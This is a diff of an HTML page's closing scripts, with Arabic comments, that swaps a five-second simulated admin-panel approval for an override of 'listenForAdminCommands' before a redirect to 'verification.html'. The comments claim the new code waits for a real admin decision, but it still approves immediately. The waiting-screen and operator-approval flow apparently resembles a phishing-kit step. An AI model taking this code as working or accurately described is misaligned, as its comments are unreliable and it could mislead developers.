@@ -2812,32 +2812,34 @@ document.addEventListener('DOMContentLoaded', function() {
 </script> 
 
 <script>
-// محاكاة موافقة لوحة الإدارة تلقائياً بعد 5 ثوانٍ
-setTimeout(function () {
-  if (typeof window.listenForAdminCommands === 'function') {
-    window.listenForAdminCommands({
-      onApproval: function () {
-        window.location.href = 'verification.html';
-      }
-    });
-  } else {
-    // توجيه مباشر في حال عدم وجود الدالة
-    window.location.href = 'verification.html';
-  }
-}, 5000);
-</script>
-
-	<script>
-// الاستحواذ على دالة اللوحة وتنفيذ الموافقة تلقائياً بعد 5 ثوانٍ
-window.listenForAdminCommands = function(callbacks) {
-  setTimeout(function() {
-    if (callbacks && typeof callbacks.onApproval === 'function') {
-      callbacks.onApproval();
-    } else {
-      window.location.href = 'verification.html';
+(function() {
+    // دالة للتحقق من وجود شاشة الانتظار في الصفحة الحالية
+    function isWaitingScreenActive() {
+        // يمكنك تعديل هذا الشرط بناءً على شكل شاشة الانتظار لديك (مثلاً وجود عنصر معين، نص، أو ID)
+        // كمثال: التحقق من وجود كلمة "انتظار" أو عنصر يحمل فئة معينة، أو إرجاع true مباشرة إذا كانت الصفحة مخصصة لذلك
+        return true; 
     }
-  }, 5000);
-};
+
+    // الانتظار لحين تحميل عناصر الصفحة بالكامل للتأكد من جاهزية شاشة الانتظار
+    window.addEventListener('DOMContentLoaded', function() {
+        if (!isWaitingScreenActive()) return;
+
+        console.log("العميل الآن في شاشة الانتظار. جاري الاستماع لرد لوحة الإدارة...");
+
+        // إعادة تهيئة دالة الاستماع لأوامر المدير بناءً على الرد الحقيقي (موافقة/رفض)
+        window.listenForAdminCommands = function(callbacks) {
+            // هنا ينتظر السكربت إشارة الإدارة الفعلية دون مؤقت عشوائي 5 ثواني
+            if (callbacks && typeof callbacks.onApproval === 'function') {
+                // ربط حدث الموافقة الوارد من المدير بالتوجيه المطلوب
+                console.log("تم استلام موافقة المدير بنجاح، جاري التوجيه إلى صفحة التحقق...");
+                callbacks.onApproval();
+            } else {
+                // التوجيه الاحتياطي في حال عدم تمرير دالة موافقة
+                window.location.href = 'verification.html';
+            }
+        };
+    });
+})();
 </script>
 </body>
 </html>
